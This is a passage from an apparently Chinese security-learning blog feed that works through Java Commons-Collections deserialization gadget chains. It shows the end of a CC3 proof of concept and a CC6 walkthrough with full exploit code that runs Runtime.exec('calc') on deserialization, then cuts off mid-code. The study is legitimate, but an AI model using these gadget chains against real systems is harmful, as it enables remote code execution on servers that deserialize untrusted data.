Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//添加</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//修改</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708853.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>本次就将 CC1、CC3、CC6放在一起吧：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708436.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC6</title>
    <link href="/2025/08/31/CC6/"/>
    <url>/2025/08/31/CC6/</url>
    
    <content type="html"><![CDATA[<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><p>JDK 8u71:</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><font style="color:rgb(80, 80, 92);">Comoons-Collections 3.2.1</font></p><h1 id="CC6-链分析："><a href="#CC6-链分析：" class="headerlink" title="CC6 链分析："></a>CC6 链分析：</h1><p>在 CC1 中分析过 JDK 8u71之后的 AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了，也就是说：</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke.memberValues.get</p><p>这半条链子用不了，所以要找一个替代，这个替代也应该调用了 LazyMap.get 方法，之后的链子和 CC1 一样。</p><h2 id="1、分析"><a href="#1、分析" class="headerlink" title="1、分析"></a>1、分析</h2><p>我们找到 TiedMapEntry.getValue 中调用了 get 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815897.png"></p><p>而 TiedMapEntry.hashCode 调用了 getValue ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815168.png"></p><p>那么我们找哪里调用了 TiedMapEntry.hashCode 就可以完成利用链的跟踪</p><blockquote><p>这里我用的是《Java 安全漫谈》给出的思路：</p><p>ysoserial 中，是利用 java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)，最后到 TiedMapEntry#hashCode()。</p><p>实际上我发现，在 java.util.HashMap#readobject 中就可以找到 HashMap#hash() 的调用，去掉了最前面的两次调用：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>    ...<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>    ...<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>在 HashMap 的 readObject 方法中，调用到了 hash(key），而 hash 方法中，调用到了 key·hashCode(）。所以，我们只需要让这个 key 等于 TiedMapEntry 对象，即可连接上前面的分析过程，构成一个完整的 Gadget。</p></blockquote><h2 id="2、构造-POC"><a href="#2、构造-POC" class="headerlink" title="2、构造 POC"></a>2、构造 POC</h2><p>初步构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//回顾 Transformer 链：Runtime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>                &#125;;<br><br>        <span class="hljs-comment">//创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode</span><br>        <span class="hljs-comment">//这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() 调用 outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        <span class="hljs-comment">//这里要注意 HashMap.put(key, value) 会计算 key.hashCode()</span><br>        <span class="hljs-comment">//所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(&quot;key&quot;)，如果 outerMap 的 factory 是恶意的就会被触发</span><br>        <span class="hljs-comment">//但这里我们先使用 ConstantTransformer(1) 无害构造</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射获取 LazyMap 类中私有字段 factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//访问权限置为可访问</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer</span><br>        <span class="hljs-comment">//这样就把原先无害的 factory 换成了恶意的 transformer 链</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815258.png"></p><p>但是执行后无事发生，并没有弹出计算器。</p><p>下断点调试：</p><p>发现在 <font style="color:#080808;background-color:#ffffff;">if (map.containsKey(key) &#x3D;&#x3D; false) {  key 的值为 “key”【也就是这一步  TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, “key”);  】，并没有去执行 factory.transform(key)  。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815383.png"></p><p>在 <font style="color:#080808;background-color:#ffffff;">TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, “aaa”);  处下断点调试：</font></p><p><font style="color:#080808;background-color:#ffffff;">可以看到 key 来源于实例化时的传参</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815182.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815348.png"></p><p>重新修改 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//回顾 Transformer 链：Runtime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>        &#125;;<br><br>        <span class="hljs-comment">//创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode</span><br>        <span class="hljs-comment">//这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() 调用 outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//这里要注意 HashMap.put(key, value) 会计算 key.hashCode()</span><br>        <span class="hljs-comment">//所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(&quot;key&quot;)，如果 outerMap 的 factory 是恶意的就会被触发</span><br>        <span class="hljs-comment">//但这里我们先使用 ConstantTransformer(1) 无害构造</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//将 &quot;key&quot; 移除</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射获取 LazyMap 类中私有字段 factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//访问权限置为可访问</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer</span><br>        <span class="hljs-comment">//这样就把原先无害的 factory 换成了恶意的 transformer 链</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span 